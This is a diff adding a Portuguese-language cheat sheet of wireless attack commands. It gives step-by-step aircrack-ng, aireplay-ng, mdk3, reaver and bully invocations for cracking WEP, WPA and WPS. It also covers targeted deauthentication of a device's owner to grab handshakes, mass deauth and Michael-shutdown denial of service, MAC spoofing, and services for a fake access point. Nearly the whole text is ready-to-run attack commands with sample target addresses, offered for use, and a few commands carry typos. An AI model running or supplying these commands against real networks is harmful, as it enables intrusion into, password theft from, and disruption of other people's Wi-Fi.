@@ -1,0 +1,228 @@
+##########################################
+#### COMANDOS PARA ATAQUES WIRELESS   ####
+##########################################
+
+BIZUS DO WIRELESS
+
+
+iwconfig - para identificar as placas wireless
+
+MODE: 
+station = managed
+monitor = snif/promisc
+master = AP
+
+-COLOCAR INTERFACE ME MODO MONITOR
+
+	ifconfig wlan0 down #necessário derrubar a placa
+	iwconfig wlan0 mode monitor
+	ifconfig wlan0 up
+
+	ou 
+
+	airmon-ng start wlan0
+
+- CRIAR UMA INTERFACE MODE MONITOR
+
+	iw dev wlan0 interface add mon0 type monitor
+
+	iwdev dev mon0 del
+
+
+- MACCHANGE para trocar o mac adress de uma interface
+
+	macchange mon0
+
+- MATAR TODOS OS SERVIÇOS COM WIFI:
+
+	airmon-ng check kill
+
+
+- MONITORAR CANAIS
+
+	airodump-ng mon0 
+	airodump-ng mon0 -c 1
+
+- VERIFICAR OS CANAIS DE UMA PLACA
+
+	iwlist wlan0 chan
+	iwlist mon0 chan
+
+- VERIFICAR A REGIÃO DA PLACA
+
+	iw reg get
+	iw reg set BR | BO | US
+
+- TODAS AS INFORMAÇÕES DA PLACA
+
+	iw phy1 info
+	airmon-ng para identificar o phy
+
+ - APAGAR LED DA PLACA
+
+ 	echo 0 > /sys/class/leds/ath9k_htc-phy2/brightness
+
+ - MOSTRAR O MAC DA PLACA
+
+ 	cat /sys/class/net/mon0/address
+
+ - SCAN COM IWLIST
+
+ 	iwlist wlan0 scan | grep -i essid | cut -d':' -f2 | tr -d '"'
+
+	iwlist wlan0 scan > /tmp/actualscan
+
+	cat /tmp/actualscan | grep -i quality | cut -d':' -f2 | tr -d '"'
+
+COMANDO PARA VERIFICAR UM CANAL
+
+	iwlist mon0 channel | grep Current | awk '{print $5}'' | tr -cd [:digi:]
+
+
+
+##########################################
+####      ATAQUES REDES WIRELESS      ####
+##########################################
+
+- TERMINAR PROCESSOS COM A PLACA WIRELESS (SEMPRE EXECUTAR ANTES DOS ATAQUES)
+
+	airmon-ng check kill
+
+- MUDAR PLACA PARA CANAL DA REDE ALVO (SEMPRE FAZER)
+	
+	iwconfig mon0 channel 4
+
+
+- ATAQUE A WEP
+
+	.Identificar o canal e o ssid da rede alvo
+
+		airodump-ng -> idt o canal e o ssid
+
+	.Capturar data da rede
+	
+		airodump-ng mon0 -c1 --bssid C4:6E:1F:45:BC:72 -w Captura (apenas trafego para romprer a senha, manter até data chegar 40000)
+
+	.Quebrar senha com o aircrack
+
+		aircrack-ng /tmp/Captura.pcap -D
+
+
+
+- ATAQUE A WPA
+
+	.monitorar com o airodump-ng até capturar um handshake
+
+		airodump-ng mon0 -c 4 -w /tmp/prueba
+
+	.Usar o aircrack-ng com uma wordlist para quebrar a senha
+
+		aircrack-ng prueba-01.cap -w /usr/share/wordlists/rockyou.txt -0
+
+	.Utilização do crunch com o aircrack-ng
+
+		crunch 8 10 0123456789 | aircrack-ng -a 2 /tmp/prueba-01.cap -e 'WLAN_VUL' -w -
+
+	.Comando para limpar dicionário
+
+		 cat rockyou.txt | sort | uniq | pw-inspector -m 8 -M 63 > kalitut.txt
+
+
+
+- ACHAR ALVO PELO MAC, DESAUTENTICAR E CAPTURAR O HANDSHAKE PARA QUEBRA DA SENHA
+
+	.BAIXAR LISTA DE MACADRESS ATUALIZADA
+
+		wget http://standards-oui.ieee.org/oui.txt
+
+	.ENCONTRAR MACADRESS DO FABRICANTE
+
+		cat oui.txt | grep -i "fabricante | Exp OnePlus, Apple"
+
+	.INICIAR UMA CAPTURA SALVANDO EM UM ARQUIVO
+
+		airodump-ng mon0 -w /tmp/scan
+
+	.VERIFICAR O ARQUIVO DE CAPTURA PARA IDENTIFICAR REGISTROS DO APARELHO E O BSSID QUE ESTÁ CONECTADO
+		
+		watch -n 1 "cat /tmp/scan-01.csv | grep C0:EE:FB"
+
+	.FORÇAR A DESAUTENTICAÇÃO DO USUÁRIO E CAPTURAR O HANDSHAKE DE NOVA CONEXÃO
+	
+		Monitorar no canal da rede
+		airodump-ng mon0 -c3 -w /tmp/resposta
+
+		aireplay-ng --deauth 20 mon0 -a 8C:0C:A3:25:CB:62 -c C0:EE:FB:47:E8:05
+		-a "BSSID da rede" -c "Mac do alvo"
+
+		quebrar a senha no arquivo de captura do handshake
+		aircrack-ng resposta-01.cap -w /usr/share/wordlists/rockyou.txt -0
+
+- DEAUTH PARA TODOS OS CLIENTES DE UM AP (NÃO FUNCIONA NA MAIORIA DAS VEZES, MELHOR, CRIAR SCRIPT PARA DESAUTENTICAR UM A UM)
+	
+	aireplay-ng --deauth 9999999 mon0 -a 8C:0C:A3:25:CB:62 &
+
+-MDK3 - FERRAMENTA PARA ATACAR UM ACCESS POINT
+	
+	.DOS de autenticação (criação de vários clientes falsos)
+
+		mdk3 mon0 a -a 8C:0C:A3:25:CB:62 -m
+
+	.Michael shutdown exploitation - (This causes Michael failure, stopping all wireless traffic. However, this only works if the target AP supports TKIP. (Can be AES+TKIP)
+
+		mdk3 mon0 m -t 8C:0C:A3:25:CB:62
+
+	. Deauthentication / Disassociation Amok Mode Kicks everybody found from AP
+		
+		mdk3 monX d -b blacklist -c X
+
+	https://forums.kali.org/showthread.php?19498-MDK3-Secret-Destruction-Mode
+
+- ATAQUE WPS 
+
+	.WASH - IDENTIFICAR APS COM WPS ATIVADO (VULNERAVEIS)
+
+		wash -i mon0
+
+	.REAVER - ATACA O WPS COM FORÇA BRUTA (MELHOR DICIONÁRIO)
+
+		reaver -i mon0 -b C4:6E:1F:45:BC:72 -S -d 10 -t 20 -l 10 -N -vv
+
+	.BULLY - ATACA O WPS COM FORÇA BRUTA
+
+		bully -b C4:6E:1F:45:BC:72 -c 3 mon0
+
+
+- ATAQUE WEP COM GERAÇÃO DE TRÁFEGO (ATIVO - FAKEAUTH + ARPREPLAY)
+
+	.Comando - intervalo de 5s mac da rede C4:6E:1F:45:BC:72 (faz autenticação falsas q permite envio de pacotes para gerar data)
+
+		aaireplay-ng -1 5 -e CheeseCake -b C4:6E:1F:45:BC:72 mon0
+
+	.Bizu para gerar tráfego contra wep (necessário fakeauth)
+
+		aireplay-ng --arpreplay -e CheeseCake mon0
+
+	.Rodar aerodump-ng
+
+		airodump-ng mon0 -c6  -w /tmp/captura 
+
+	.rodar o aircrack-ng
+
+		aircrack-ng /tmp/captura-01.pcap -D
+
+
+- MACCHANGE - COPIAR SCRIPT PARA O INIT.D A FIM DE TROCAR O MAC ADRESS DAS PLACAS DE REDE ANTES DE INICIAR QUALQUER SERVIÇO
+
+	apt-get install moreutils
+	random_mac.sh
+	/etc/init.d
+
+- SERVIÇOS PARA UM FACEAP
+
+	- ssh server
+	- dyndns
+	- iptables
+	- dnsmasq
+	- hostapd
+	- tcpdump
